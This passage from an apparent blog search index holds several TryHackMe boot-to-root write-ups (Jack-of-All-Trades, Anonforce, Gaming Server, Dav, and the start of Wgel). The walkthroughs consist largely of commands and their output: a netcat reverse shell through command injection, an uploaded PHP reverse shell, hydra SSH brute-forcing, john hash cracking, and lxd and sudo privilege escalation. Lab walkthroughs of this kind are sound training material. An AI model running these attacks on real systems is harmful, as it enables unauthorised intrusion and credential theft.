comment:\n1 2 3  \u0026lt;!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= --\u0026gt;   \nDecoded message includes shortened link bit.ly/2TvYQ2S which translates to https://en.wikipedia.org/wiki/Stegosauria\nThis is a hint for Steganography so navigate back to the main page and download the header image. Use flag info to check if something was hidden in the jpg image. Then extract -sf to extract hidden message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  steghide info header.jpg \u0026#34;header.jpg\u0026#34;: format: jpeg capacity: 3.5 KB Try to get information about embedded data ? (y/n) y Enter passphrase: steghide: could not extract any data with that passphrase! steghide extract -sf header.jpg Enter passphrase: wrote extracted data to \u0026#34;cms.creds\u0026#34;. ls total 84K drwxr-xr-x 12 root root 4.0K Jan 5 12:54 .. -rw-r--r-- 1 root root 69K Jan 5 12:54 header.jpg -rw-r--r-- 1 root root 93 Jan 5 12:56 cms.creds drwxr-xr-x 2 root root 4.0K Jan 5 12:56 . cat cms.creds 1 Here you go Jack. Good thing you thought ahead! 2 3 Username: jackinthebox 4 Password: TplFxiSHjY   Success! We found credentials for recovery.php where we can login.\nGaining Access \nBased on the hint we can provide any command after ?cmd= which will be executed on the server side and the output will be printed for us right on the page.\nLet\u0026rsquo;s try it with command id\n\nFormat for Web Netcat Reverse shell: http://{TARGET MACHINE IP}:22/nnxhweOV/index.php?cmd=nc -e /bin/sh {LOCAL MACHINE IP} {PORT}\nBefore running a nc reverse shell start a listener on the local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  nc -lnvp 3333 listening on [any] 3333 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.122.111] 34946 whoami www-data python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ cd /home www-data@jack-of-all-trades:/home$ ls -la ls -la total 16 drwxr-xr-x 3 root root 4096 Feb 29 2020 . drwxr-xr-x 23 root root 4096 Feb 29 2020 .. drwxr-x--- 3 jack jack 4096 Feb 29 2020 jack -rw-r--r-- 1 root root 408 Feb 29 2020 jacks_password_list www-data@jack-of-all-trades:/home$ cat jacks_password_list cat jacks_password_list *hclqAzj+2GC+=0K eN\u0026lt;A@n^zI?FE$I5, X\u0026lt;(@zo2XrEN)#MGC ,,aE1K,nW3Os,afb ITMJpGGIqg1jn?\u0026gt;@ 0HguX{,fgXPE;8yF sjRUb4*@pz\u0026lt;*ZITu [8V7o^gl(Gjt5[WB yTq0jI$d}Ka\u0026lt;T}PD Sc.[[2pL\u0026lt;\u0026gt;e)vC4} 9;}#q*,A4wd{\u0026lt;X.T M41nrFt#PcV=(3%p GZx.t)H$\u0026amp;awU;SO\u0026lt; .MVettz]a;\u0026amp;Z;cAC 2fh%i9Pr5YiYIf51 TDF@mdEd3ZQ(]hBO v]XBmwAk8vk5t3EF 9iYZeZGQGG9\u0026amp;W4d1 8TIFce;KjrBWTAY^ SeUAwt7EB#fY\u0026amp;+yt n.FZvJ.x9sYe5s5d 8lN{)g32PG,1?[pM z@e1PmlmQ%k5sDz@ ow5APF\u0026gt;6r,y4krSo www-data@jack-of-all-trades:/home$ python -m SimpleHTTPServer 8000 python -m SimpleHTTPServer 8000 Serving HTTP on 0.0.0.0 port 8000 ...   In the home directory we can find password file which we will download with help of python server.\n\nSSH Brute-Forcing 1 2 3 4 5 6 7 8 9 10  hydra -l jack -P jacks_password_list ssh://{TARGET MACHINE IP} -s 80 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-05 13:25:01 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task [DATA] attacking ssh://10.10.122.111:80/ [80][ssh] host: 10.10.122.111 login: jack password: ITMJpGGIqg1jn?\u0026gt;@ 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-05 13:25:06   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ssh jack@{TARGET MACHINE IP} -p 80 The authenticity of host \u0026#39;[10.10.122.111]:80 ([10.10.122.111]:80)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:wABOsY4G6TIcuJ2bmAIpsoBGVR06p/QGP2J7tfiSy2s. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[10.10.122.111]:80\u0026#39; (ECDSA) to the list of known hosts. jack@10.10.122.111\u0026#39;s password: jack@jack-of-all-trades:~$ ls -la total 312 drwxr-x--- 3 jack jack 4096 Feb 29 2020 . drwxr-xr-x 3 root root 4096 Feb 29 2020 .. lrwxrwxrwx 1 root root 9 Feb 29 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 jack jack 220 Feb 29 2020 .bash_logout -rw-r--r-- 1 jack jack 3515 Feb 29 2020 .bashrc drwx------ 2 jack jack 4096 Feb 29 2020 .gnupg -rw-r--r-- 1 jack jack 675 Feb 29 2020 .profile -rwxr-x--- 1 jack jack 293302 Feb 28 2020 user.jpg jack@jack-of-all-trades:~$ python -m SimpleHTTPServer 3333 Serving HTTP on 0.0.0.0 port 3333 ...   Once again start the pyhton server so we can view the user.jpg image.\nUser Flag \nRoot Flag Now use find command to look for all files with SUID.\nSUID is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command. (https://www.linuxnix.com/suid-set-suid-linuxunix/)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  jack@jack-of-all-trades:~$ find / -perm /4000 2\u0026gt; /dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/pt_chown /usr/bin/chsh /usr/bin/at /usr/bin/chfn /usr/bin/newgrp /usr/bin/strings /usr/bin/sudo /usr/bin/passwd /usr/bin/gpasswd /usr/bin/procmail /usr/sbin/exim4 /bin/mount /bin/umount /bin/su   And we are lucky because thanks to SUID permission for strings we are able to read the root.txt\n1 2 3 4 5 6 7 8  jack@jack-of-all-trades:~$ strings /root/root.txt ToDo: 1.Get new penguin skin rug -- surely they won\u0026#39;t miss one or two of those blasted creatures? 2.Make T-Rex model! 3.Meet up with Johny for a pint or two 4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her? 5.Remember to finish that contract for Lisa. 6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}   ","description":"Boot-to-root originally designed for Securi-Tay 2020","id":9,"section":"posts","tags":["enumeration","privilege escalation","steganography","command injection","brute force"],"title":"Jack-of-All-Trades [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/jack-of-all-trades/"},{"content":"   Title Anonforce     Info Boot2root machine for FIT and bsides guatemala CTF   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 03:05 CST Nmap scan report for 10.10.21.216 Host is up (0.070s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Jan 04 01:03 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 102 0 0 0 Jan 04 01:03 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Jan 04 01:03 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Jan 04 01:03 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.9.140.180 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)   FTP Based on nmap scan we are allowed to use anonymous authentication.\nLooking around we can find two interesting files in the /notread directory.\nDownload both backup.pgp and private.asc to your local machine with get command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  ftp {TARGET MACHINE IP} Connected to 10.10.21.216. 220 (vsFTPd 3.0.3) Name (10.10.21.216:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ftp\u0026gt; cd notread 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 . drwxr-xr-x 23 0 0 4096 Aug 11 2019 .. -rwxrwxrwx 1 1000 1000 524 Aug 11 2019 backup.pgp -rwxrwxrwx 1 1000 1000 3762 Aug 11 2019 private.asc 226 Directory send OK. ftp\u0026gt; get backup.pgp local: backup.pgp remote: backup.pgp 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.pgp (524 bytes). 226 Transfer complete. 524 bytes received in 0.00 secs (563.5669 kB/s) ftp\u0026gt; get private.asc local: private.asc remote: private.asc 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for private.asc (3762 bytes). 226 Transfer complete. 3762 bytes received in 0.00 secs (1.1955 MB/s)   User flag Proceeding with enumeration we can find user flag in melodias folder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ftp\u0026gt; cd home 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 0 0 4096 Aug 11 2019 . drwxr-xr-x 23 0 0 4096 Aug 11 2019 .. drwxr-xr-x 4 1000 1000 4096 Aug 11 2019 melodias 226 Directory send OK. ftp\u0026gt; cd melodias 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Aug 11 2019 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). 226 Transfer complete. 33 bytes received in 0.00 secs (8.7075 kB/s) ftp\u0026gt; cat user.txt | wc -c 40   GPG 1 2 3 4 5 6 7  ls total 20K -rw-r--r-- 1 root root 524 Jan 4 03:22 backup.pgp -rw-r--r-- 1 root root 3.7K Jan 4 03:22 private.asc -rw-r--r-- 1 root root 33 Jan 4 03:22 user.txt drwxr-xr-x 16 root root 4.0K Jan 4 03:25 .. drwxr-xr-x 2 root root 4.0K Jan 4 03:27 .   Prepare found key file for decryption with gpg2john and then crack the passphrase.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  gpg2john private.asc \u0026gt; hash john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2021-01-04 03:30) 4.545g/s 4227p/s 4227c/s 4227C/s xbox360..sheena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Now we are able to import previously downloaded private key with the cracked passphrase.\n1 2 3 4 5 6 7 8 9  gpg --import private.asc gpg: key B92CD1F280AD82C2: public key \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; imported gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: imported: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1   Gaining Access Backup decryption revealed that it is an actually copy of the shadow file with the root password hash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7:::   Root flag Root password hash: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0\nSaved to rootHash and analysed with hash-identifier.\n1 2 3 4 5 6 7  hash-identifier ------------------------------------------------- HASH: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0 Possible Hashs: [+] SHA-256 --------------------------------------------------   Now as we know the hash format we can crack it with john and then authenticate with ssh as root.\n1 2 3 4 5 6 7 8 9 10  john --format=sha512crypt rootHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hikari (?) 1g 0:00:00:06 DONE (2021-01-04 03:35) 0.1545g/s 1048p/s 1048c/s 1048C/s 98765432..random1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ssh root@{TARGET MACHINE IP} The authenticity of host \u0026#39;10.10.21.216 (10.10.21.216)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.21.216\u0026#39; (ECDSA) to the list of known hosts. root@10.10.21.216\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. root@ubuntu:~# ls root.txt root@ubuntu:~# cat root.txt | wc -c 33   ","description":"Boot2root machine for FIT and bsides guatemala CTF","id":10,"section":"posts","tags":["ftp","pgp","gpg","hash cracking"],"title":"Anonforce [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/anonforce/"},{"content":"   Title Gaming Server     Info An Easy Boot2Root box for beginners   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 01:08 CST Nmap scan report for 10.10.125.45 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) |_ 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: House of danak   Note found in the source code of the page:\n1 2 3  \u0026lt;/body\u0026gt; \u0026lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\u0026gt; \u0026lt;/html\u0026gt;   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.125.45 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/03 01:08:48 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /secret (Status: 301) /server-status (Status: 403) /uploads (Status: 301) =============================================================== 2021/01/03 01:09:26 Finished =============================================================== http://{TARGET MACHINE IP}/robots.txt user-agent: * Allow: / /uploads/   \nFound file dict.lst contains a list of passwords.\nThe text file manifesto.txt looks like a message from a hacker.\nWhen we try to extract data from the meme.jpg image with steghide we are prompted to enter the passphrase which we don\u0026rsquo;t have for now.\nBack to results from Directory Brute-Forcing. Navigate to /secret directory.\nSomebody left a private key for ssh here for us.\n\nGaining Access Let\u0026rsquo;s crack the passphrase with john.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ssh2john.py secretKey\u0026gt; secretKeyHash john --wordlist=/usr/share/wordlists/rockyou.txt secretKeyHash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status letmein (secretKeyHash) 1g 0:00:00:09 DONE (2021-01-03 01:19) 0.1026g/s 1472Kp/s 1472Kc/s 1472KC/sa6_123..*7¡Vamos! Session completed   Based on the note from the source code let\u0026rsquo;s try ssh as john:\n1  ssh -i secret_id_rsa john@{TARGET MACHINE IP}   Use the cracked passphrase and we are in.\nUser Flag Located in /home/john\nPrivilege Escalation 1 2  john@exploitable:~$ id uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)   How to exploit lxd: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2\nThe script is on github:\n1 2 3 4  git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alphine-bulder ./build-alphine   Running the builder gives us an image inside a .tar.gz file.\nLet’s transfer it to the remote machine\nOn the local machine:\n1  python3 -m http.server   On the target machine:\n1  wget http://{LOCAL MACHINE IP}:8000/alpine-v3.12-x86_64-20210103_0137.tar.gz   Let’s add the image to lxd using the following command:\n1  lxc image import ./alpine-v3.12-x86_64-20210103_0137.tar.gz --alias myimage   After that we can initialize the image inside a new Linux container. Then mount it to the root directory.\n1 2 3  lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite   Root flag Now execute the /bin/sh to get root\n1 2 3 4 5 6 7  lxc exec ignite /bin/sh ~ # whoami root ~ # find / -type f -name root.txt 2\u0026gt;/dev/null /mnt/root/root/root.txt   ","description":"An Easy Boot2Root box for beginners","id":11,"section":"posts","tags":["enumeration","hash cracking","lxd","privilege escalation"],"title":"Gaming Server [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/gaming-server/"},{"content":"   Title Dav     Info Boot2root machine for FIT and bsides guatemala CTF   Difficulty Easy    Scanning \u0026amp; Enumeration NMAP 1 2 3 4 5 6  nmap -A -T4 10.10.237.27 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://10.10.237.27 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.237.27 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/02 14:27:27 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /server-status (Status: 403) /webdav (Status: 401) =============================================================== 2021/01/02 14:28:12 Finished ===============================================================   Gaining Access WebDAV When accessing /webdav we are prompted with Authentication Required window:\n\nDefault credentials for WebDAV:\n https://community.apachefriends.org/f/viewtopic.php?p=83805 https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html\n  \nContent found in passwd.dav:\nwampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91\n1 2 3 4 5 6 7  hash-identifier -------------------------------------------------- HASH: $apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91 Possible Hashs: [+] MD5(APR) --------------------------------------------------   For working with WebDAV we will use cadaver:\n http://www.webdav.org/cadaver/\nUse default credentials and upload PHP reverse shell:\n1 2 3 4 5 6 7 8 9 10  cadaver http://http://10.10.237.27/webdav/ Could not resolve hostname `http\u0026#39;: Host not found dav://10.10.237.27/webdav/? open http://10.10.237.27/webdav/ Authentication required for webdav on server `10.10.237.27\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; put php-reverse-shell.php Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php\u0026#39;: Progress: [=============================\u0026gt;] 100.0% of 5494 bytes succeeded. dav:/webdav/\u0026gt;    1 2 3 4 5 6 7 8 9 10 11  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.237.27] 43474 Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 12:51:49 up 27 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $   User Flag Located in /home/merlin\nRoot Flag 1 2 3 4 5 6 7 8 9  sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat sudo cat /root/root.txt   ","description":"Boot2root machine for FIT and bsides guatemala CTF","id":12,"section":"posts","tags":["exploitation","hash cracking","privilege escalation"],"title":"Dav [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/dav/"},{"content":"   Title Wgel     Info Can you exfiltrate the root flag?   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11  nmap -A -T4 10.10.184.94 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works   Always look around the source code for names which can be later used as possible usernames for services.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://10.10.184.94 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.94 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/01 11:16:59 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /server-status (Status: 403) /sitemap (Status: 301) =============================================================== 2021/01/01 11:17:37 Finished ===============================================================   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  gobuster dir -u http://10.10.184.94/sitemap -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.184.94/sitemap [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status 